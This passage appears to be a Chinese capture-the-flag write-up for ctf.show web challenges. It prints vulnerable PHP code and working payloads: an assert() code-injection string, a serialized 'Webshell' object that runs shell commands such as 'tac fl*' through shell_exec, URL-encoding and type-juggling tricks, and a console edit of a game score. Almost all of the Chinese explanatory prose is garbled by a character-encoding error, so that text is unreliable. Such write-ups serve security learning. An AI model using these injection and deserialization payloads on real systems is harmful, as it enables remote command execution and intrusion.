</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œgetä¼ å…¥numï¼Œå…ˆåˆ¤æ–­numå€¼æ˜¯å¦ç­‰äº114514ï¼Œæ˜¯çš„è¯æ‰§è¡Œä¸‹é¢è¯­å¥ã€‚<br><code>assert(&quot;intval($_GET[num])==1919810&quot;) or die(&quot;ä¸€è¨€æ—¢å‡ºï¼Œé©·é©¬éš¾è¿½!&quot;);</code><br>æ­¤è¯­å¥å…ˆå°† GET è¯·æ±‚ä¸­çš„å‚æ•° num è½¬æ¢ä¸ºæ•´æ•°ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦ç­‰äº 1919810ã€‚å¦‚æœç›¸ç­‰ï¼Œåˆ™ç»§ç»­æ‰§è¡Œä¸‹é¢çš„ä»£ç ï¼›å¦åˆ™ï¼Œè¾“å‡ºé”™è¯¯ä¿¡æ¯å¹¶ç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œã€‚<br><strong>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œ</strong>ï¼Œä¹Ÿå°±æ˜¯ä¼ å…¥<code>?num=114514);//</code>ç”±äºåœ¨phpä¸­æˆ‘ä»¬ä¼ å…¥çš„<code>114514);//</code>åªä¼šè¾¨åˆ«å‡ºå‰é¢çš„æ•°å­—<strong>114514</strong>å†æ‰§è¡Œ<strong>assert</strong>æ­¤æ—¶è¯­å¥æå‰é—­åˆï¼Œä¹Ÿå°±æ˜¯<code>assert(&quot;intval($_GET114514);//)==1919810&quot;) or die(&quot;ä¸€è¨€æ—¢å‡ºï¼Œé©·é©¬éš¾è¿½!&quot;);</code>åé¢è¢«æ³¨é‡Šæ‰äº†ç›´æ¥æ‰§è¡Œ<code>echo $flag;</code>å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/da7eab8fd3c44e4bb95ac6cf0a9cf4f3.png" alt="1"></p>
<blockquote>
<p>phpä¸­å…¶ä¸­ä¸¤ç§æ¯”è¾ƒç¬¦å·:<br>&#x3D;&#x3D;ï¼šå…ˆå°†å­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆç›¸åŒï¼Œå†æ¯”è¾ƒ<br>&#x3D;&#x3D;&#x3D;ï¼šå…ˆåˆ¤æ–­ä¸¤ç§å­—ç¬¦ä¸²çš„ç±»å‹æ˜¯å¦ç›¸ç­‰ï¼Œå†æ¯”è¾ƒ<br>å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒä½¿ç”¨&#x3D;&#x3D;æ—¶,å­—ç¬¦ä¸²ä¼šå…ˆè½¬æ¢ä¸ºæ•°å­—ç±»å‹å†æ¯”è¾ƒ<br>var_dump(â€˜aâ€™ &#x3D;&#x3D; 0);&#x2F;&#x2F;trueï¼Œæ­¤æ—¶aå­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆæ•°å­—ï¼Œå› ä¸ºaå­—ç¬¦ä¸²å¼€å¤´ä¸­æ²¡æœ‰æ‰¾åˆ°æ•°å­—ï¼Œæ‰€ä»¥è½¬æ¢ä¸º0<br>var_dump(â€˜123aâ€™ &#x3D;&#x3D; 123);&#x2F;&#x2F;trueï¼Œè¿™é‡Œâ€™123aâ€™ä¼šè¢«è½¬æ¢ä¸º123<br>var_dump(â€˜a123â€™ &#x3D;&#x3D; 123);&#x2F;&#x2F;falseï¼Œå› ä¸ºphpä¸­æœ‰è¿™æ ·ä¸€ä¸ªè§„å®šï¼šå­—ç¬¦ä¸²çš„å¼€å§‹éƒ¨åˆ†å†³å®šäº†å®ƒçš„å€¼ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å­—å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å­—è‡³å’Œå®ƒè¿ç»­çš„æœ€åä¸€ä¸ªæ•°å­—ç»“æŸï¼Œå¦åˆ™å…¶æ¯”è¾ƒæ—¶æ•´ä½“å€¼ä¸º0ã€‚</p>
</blockquote>
<p>è¿˜å¯ä»¥ä½¿ç”¨è¿ç®—æ³•<code>/?num=114514%2B1805296</code>åŠ å·è¢«urlç¼–ç **%2B**ä¹Ÿå¯å¾—åˆ°flagã€‚</p>
<h2 id="é©·é©¬éš¾è¿½"><a href="#é©·é©¬éš¾è¿½" class="headerlink" title="é©·é©¬éš¾è¿½"></a>é©·é©¬éš¾è¿½</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>  
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">114514</span> <span class="token operator">&amp;&amp;</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
              <span class="token function">assert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"intval(<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span>num<span class="token punctuation">]</span></span>)==1919810"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä¸€è¨€æ—¢å‡ºï¼Œé©·é©¬éš¾è¿½!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> 

<span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]|\;|\(|\)/"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>å…¶ä¸­ï¼Œcheck() å‡½æ•°çš„ä½œç”¨æ˜¯æ£€æŸ¥è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­æ˜¯å¦åŒ…å«å­—æ¯ã€åˆ†å·ã€æ‹¬å·ç­‰ç‰¹æ®Šå­—ç¬¦ã€‚å¦‚æœæ²¡æœ‰åŒ…å«è¿™äº›å­—ç¬¦ï¼Œåˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚</p>
</blockquote>
<p>å…ˆè¯´ä¸€ç§è§£æ³•ï¼Œå’Œä¸Šä¸€é¢˜æ³•äºŒä¸€æ ·</p>
<blockquote>
<p>å¯ä»¥ä½¿ç”¨è¿ç®—æ³•<code>/?num=114514%2B1805296</code>åŠ å·è¢«urlç¼–ç **%2B**ä¹Ÿå¯å¾—åˆ°flagã€‚</p>
</blockquote>
<h3 id="chatgptå¯¹ä»£ç çš„åˆ†æ"><a href="#chatgptå¯¹ä»£ç çš„åˆ†æ" class="headerlink" title="chatgptå¯¹ä»£ç çš„åˆ†æ"></a>chatgptå¯¹ä»£ç çš„åˆ†æ</h3><blockquote>
<p>è¯¥ä»£ç çš„ä½œç”¨æ˜¯æ¥å—ä¸€ä¸ªåä¸º â€œnumâ€ çš„ GET è¯·æ±‚å‚æ•°ï¼Œå¦‚æœå‚æ•°å€¼ç­‰äº 114514 å¹¶ä¸”ç»è¿‡ check()<br>å‡½æ•°æ£€æŸ¥æ²¡æœ‰åŒ…å«å­—æ¯ã€åˆ†å·ã€æ‹¬å·ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œåˆ™ä¼šè¾“å‡º $flag å˜é‡çš„å€¼ã€‚</p>
<p>å…¶ä¸­ï¼Œcheck() å‡½æ•°çš„ä½œç”¨æ˜¯æ£€æŸ¥è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­æ˜¯å¦åŒ…å«å­—æ¯ã€åˆ†å·ã€æ‹¬å·ç­‰ç‰¹æ®Šå­—ç¬¦ã€‚å¦‚æœæ²¡æœ‰åŒ…å«è¿™äº›å­—ç¬¦ï¼Œåˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å›<br>falseã€‚</p>
<p>ä¸è¿‡åœ¨ç¬¬ 6 è¡Œä»£ç ä¸­ï¼Œä½¿ç”¨äº† assert() å‡½æ•°æ¥åˆ¤æ–­ $_GET[â€˜numâ€™] æ˜¯å¦ç­‰äº<br>1919810ï¼Œå¦‚æœä¸ç­‰äºå°±ä¼šè¾“å‡ºä¸€æ®µæç¤ºä¿¡æ¯å¹¶ç»ˆæ­¢ç¨‹åºè¿è¡Œã€‚æ³¨æ„åˆ° assert()<br>å‡½æ•°æ˜¯ä¸€ä¸ªéå¸¸å±é™©çš„å‡½æ•°ï¼Œå› ä¸ºå®ƒä¼šå°†å­—ç¬¦ä¸²å‚æ•°å½“ä½œä»£ç æ‰§è¡Œï¼Œå› æ­¤å¦‚æœåœ¨è¾“å…¥ $_GET[â€˜numâ€™]<br>çš„æ—¶å€™ä¼ å…¥äº†ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œå°±å¯èƒ½å¯¼è‡´ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p>
<p>ç”±äºä»£ç ä¸­åŒ…å«äº† flag.php æ–‡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•å¾—çŸ¥ $flag å˜é‡çš„å€¼ã€‚ä¸è¿‡å¯ä»¥å°è¯•æ„é€ ç¬¦åˆæ¡ä»¶çš„ $_GET[â€˜numâ€™]<br>å‚æ•°ï¼Œä½¿å¾—ç¨‹åºè¾“å‡º $flag å˜é‡çš„å€¼ã€‚æ³¨æ„åˆ° check()<br>å‡½æ•°ä¸­åªæ£€æŸ¥äº†å­—æ¯ã€åˆ†å·ã€æ‹¬å·ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨æ•°å­—ã€åŠ å·ã€å‡å·ç­‰å¸¸è§„å­—ç¬¦æ¥æ„é€ å‚æ•°ã€‚</p>
</blockquote>
<h2 id="TapTapTap"><a href="#TapTapTap" class="headerlink" title="TapTapTap"></a>TapTapTap</h2><blockquote>
<p>ç½‘é¡µæ¸¸æˆç±»çš„é¢˜ç›®ç›´æ¥æŸ¥çœ‹å…¶æºä»£ç ã€‚</p>
</blockquote>
<p>åœ¨jsæ–‡ä»¶é‡Œçœ‹åˆ°æœ‰base64åŠ å¯†çš„å†…å®¹ã€‚è§£ç çœ‹çœ‹ã€‚<br><img src="https://img-blog.csdnimg.cn/5c5b3b1d2ec643d0a963c33a2fa414c7.png" alt="2"></p>
<blockquote>
<p>Your flag is in &#x2F;secret_path_you_do_not_know&#x2F;secretfile.txt</p>
</blockquote>
<p>ç›´æ¥è®¿é—®å¾—åˆ°flagã€‚</p>
<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p><strong>è€ƒç‚¹ï¼šååºåˆ—åŒ–</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Webshell</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo "Hello World!"'</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$serializecmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$unserializecmd</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serializecmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$unserializecmd</span><span class="token operator">-></span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä»£ç çš„æ„æ€æ˜¯å®šä¹‰äº†ä¸€ä¸ªwebshellç±»ï¼Œé‡Œé¢åŒ…å«ä¸€ä¸ªå…¬å…±å±æ€§ï¼ˆ<strong>cmd</strong>ï¼‰å’Œä¸‰ä¸ªå…¬å…±æ–¹æ³•ï¼ˆ**_construct()ï¼Œinit()ï¼Œexec()<strong>ï¼‰å…¶ä¸­init()æ–¹æ³•åœ¨æ„é€ å‡½æ•°_construct()ä¸­è¢«è°ƒç”¨ï¼Œç›®çš„æ˜¯ç”¨æ¥æ£€æŸ¥cmdå€¼ä¸­æ˜¯å¦å«æœ‰å‚æ•°</strong>flag<strong>å¦‚æœå«æœ‰ï¼Œåˆ™è¾“å‡º</strong>Hello World!<strong>ï¼Œåä¹‹ï¼Œåˆ™è°ƒç”¨exec()æ–¹æ³•æ¥æ‰§è¡Œ</strong>$cmd**ã€‚<br><img src="https://img-blog.csdnimg.cn/b09519fa51e74250a34f9e317b3884ce.png" alt="1"><br>å…·ä½“æ¥è¯´ï¼Œå¯ä»¥æ‰§è¡Œå¦‚ä¸‹çš„ä»£ç ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Webshell</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ls"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$W</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Webshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$W</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p> å¾—åˆ°<strong>O:8:â€Webshellâ€:1:{s:3:â€cmdâ€;s:2:â€lsâ€;}</strong></p>
<blockquote>
<p>è¿™ä¸ªå­—ç¬¦ä¸²è¡¨ç¤ºä¸€ä¸ªåŒ…å«ä¸€ä¸ªåä¸º cmd çš„å±æ€§çš„ Webshell ç±»å¯¹è±¡ã€‚s:3:â€cmdâ€ è¡¨ç¤ºå±æ€§åå­—çš„é•¿åº¦ä¸º 3ï¼Œs:2:â€lsâ€ è¡¨ç¤º $cmd å±æ€§çš„å€¼ä¸º â€œlsâ€ï¼Œå®ƒçš„é•¿åº¦ä¸º 2ã€‚é€šè¿‡å°†è¿™ä¸ªå­—ç¬¦ä¸²ä¼ é€’ç»™ unserialize() å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶ååºåˆ—åŒ–ä¸ºä¸€ä¸ª Webshell å¯¹è±¡ï¼Œå¹¶æ‰§è¡Œå…¶ä¸­åŒ…å«çš„å‘½ä»¤ã€‚</p>
</blockquote>
<p>urlï¼š<code>http://a45cc446-ca14-40ca-92e4-8da67a3cc623.challenge.ctf.show/?cmd=O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</code><br><img src="https://img-blog.csdnimg.cn/4cc0a2e1e93546adba733d88ea1641e3.png" alt="3"><br>urlï¼š<code>http://a45cc446-ca14-40ca-92e4-8da67a3cc623.challenge.ctf.show/?cmd=O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:7:&quot;tac fl*&quot;;&#125;</code><br><img src="https://img-blog.csdnimg.cn/4df37ceb5f164c95b99945642caeb496.png" alt="2"></p>
<h2 id="åŒ–é›¶ä¸ºæ•´"><a href="#åŒ–é›¶ä¸ºæ•´" class="headerlink" title="åŒ–é›¶ä¸ºæ•´"></a>åŒ–é›¶ä¸ºæ•´</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>

<span class="token variable">$result</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;=</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä½ å¤ªé•¿äº†ï¼ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$result</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">===</span><span class="token string double-quoted-string">"å¤§ç‰›"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>count()ç”¨æ¥ç»Ÿè®¡getä¼ å…¥å‚æ•°çš„ä¸ªæ•°ï¼Œå¦‚æœä¼ å…¥**?a&#x3D;1<strong>ï¼Œé‚£å°±æ˜¯ä¸€ä¸ªå‚æ•°ï¼Œä¼ å…¥</strong>?a&#x3D;1&amp;b&#x3D;2<strong>ï¼Œé‚£å°±æ˜¯ä¸¤ä¸ªå‚æ•°ã€‚<br>strlen()ç”¨æ¥è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå¦‚æœå¤§äº1ï¼Œé‚£å°±æ‰§è¡Œdieï¼Œå¦åˆ™å°†ä¼ å…¥çš„getå‚æ•°æ‹¼æ¥åˆ°resultä¸­ã€‚<br>ç„¶åå¦‚æœresult&#x3D;&#x3D;&#x3D;å¤§ç‰›ï¼Œé‚£å°±è¾“å‡ºflagã€‚<br><strong>åœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦çŸ¥é“</strong><br><code>å¤§ç‰›</code>åœ¨urlç¼–ç åæ˜¯<code>%E5%A4%A7%E7%89%9B</code>ä¸€ä¸ª%E5å ç”¨ä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡å°†</strong>å¤§ç‰›<strong>è¿›è¡Œurlç¼–ç ç„¶å</strong>forå‡½æ•°**è¿›è¡Œæ‹¼æ¥å¾—åˆ°flagã€‚ä¸€ä¸ªæ±‰å­—æœ‰3ä½urlç¼–ç ï¼Œç„¶åç”¨1-6</p>
<p>payload<code>http://da499d91-835d-4543-9c2e-faa0b2ea3723.challenge.ctf.show?1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</code>ä¹‹åå¾—åˆ°flagã€‚</p>
<h2 id="æ— ä¸€å¹¸å…"><a href="#æ— ä¸€å¹¸å…" class="headerlink" title="æ— ä¸€å¹¸å…"></a>æ— ä¸€å¹¸å…</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonono!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™ä¸ªé¢˜çš„æ„ä¹‰æ˜¯å•¥å‘¢ï¼Ÿ<br>æˆ‘å°±payload<code>?0=1</code>ï¼Œflagå°±å‡ºæ¥äº†ã€‚</p>
<h2 id="ä¼ è¯´ä¹‹ä¸‹ï¼ˆé›¾ï¼‰"><a href="#ä¼ è¯´ä¹‹ä¸‹ï¼ˆé›¾ï¼‰" class="headerlink" title="ä¼ è¯´ä¹‹ä¸‹ï¼ˆé›¾ï¼‰"></a>ä¼ è¯´ä¹‹ä¸‹ï¼ˆé›¾ï¼‰</h2><p><img src="https://img-blog.csdnimg.cn/86faa25095144eb18cf9de64afbcc1da.png" alt="1">æ¸¸æˆç•Œé¢ï¼Œé‚£å°±æ‰¾ä¸€ä¸‹jsä»£ç ã€‚<br><img src="https://img-blog.csdnimg.cn/71650c9a07134eb5b6c38dbbc521594f.png" alt="1"><br>ä»–è¯´åˆ†æ•°è¾¾åˆ°2077åå°±ç»™flagã€‚åœ¨å‰ç«¯æ”¹ä¸€ä¸‹è¯•è¯•ï¼Œ<br><img src="https://img-blog.csdnimg.cn/b6106be08f764e75a1e4894ec5956cf4.png" alt="1"><br>å‘ç°ä¸è¡Œã€‚å†å¥½å¥½æ‰¾ä¸€ä¸‹ï¼Œåœ¨jsæ–‡ä»¶ä¸­æœç´¢scoreã€‚æ‰¾åˆ°å…³é”®ç‚¹<br><img src="https://img-blog.csdnimg.cn/8fb09945e91f47979007d09792c3f4d9.png" alt="2"><br>åˆå­¦åˆ°äº†ä¸€ä¸ªï¼Œåœ¨æ­¤å¤„ä¸‹æ–­ç‚¹ï¼ˆç‚¹å‡»275å³å¯ï¼‰ï¼Œ<br><img src="https://img-blog.csdnimg.cn/5e5a7f6f549649f78e132f1eea8d43e9.png" alt="3"><br>ç„¶åå¼€å§‹æ¸¸æˆç­‰åˆ°åƒäº†ä¸€ä¸ªè‹¹æœçš„æ—¶å€™ï¼Œç¨‹åºä¼šåœ¨æ–­ç‚¹åœä¸‹ï¼Œ<br><img src="https://img-blog.csdnimg.cn/f4ee69e852294ad4a6759ec9dc942294.png" alt="4"><br>åœ¨æ§åˆ¶å°è¾“å…¥<code>var nowScore = this.score += 2078</code>å›è½¦ï¼Œ<br><img src="https://img-blog.csdnimg.cn/e683ba59ae094d319d18982091228622.png" alt="5"><br>ç„¶åç»§ç»­æ¸¸æˆ<br><img src="https://img-blog.csdnimg.cn/6574abd9ddaa4ac6888479fdb6939508.png" alt="6"><br>å¾—åˆ°flagã€‚</p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="0x36d"><a href="#0x36d" class="headerlink" title="0x36d"></a>0x36d</h2><p>ğŸ˜«ğŸ™„ğŸ‘°ğŸ˜°ğŸ‘£ğŸ™‹ğŸ˜±ğŸ‘§ğŸ‘ŒğŸ‘·ğŸ‘¯ğŸ‘©ğŸ˜´ğŸ‘–ğŸ‘«ğŸ‘šğŸ™ƒğŸ‘¹ğŸ‘ğŸ‘ğŸ˜¶ğŸ‘³ğŸ˜«ğŸ‘•ğŸ™‚ğŸ™ŠğŸ‘µğŸ‘¶ğŸ‘¨ğŸ‘°ğŸ‘®ğŸ™‰ğŸ‘¶ğŸ‘µğŸ‘¸ğŸ‘²ğŸ‘ºğŸ‘®ğŸ‘‘ğŸ˜¶ğŸ‘´ğŸ˜«ğŸ™ŠğŸ‘«ğŸ˜´ğŸ‘¬ğŸ‘¹ğŸ‘¤ğŸ‘‘ğŸ˜±ğŸ‘—ğŸ™ƒğŸ‘ğŸ˜¶</p>
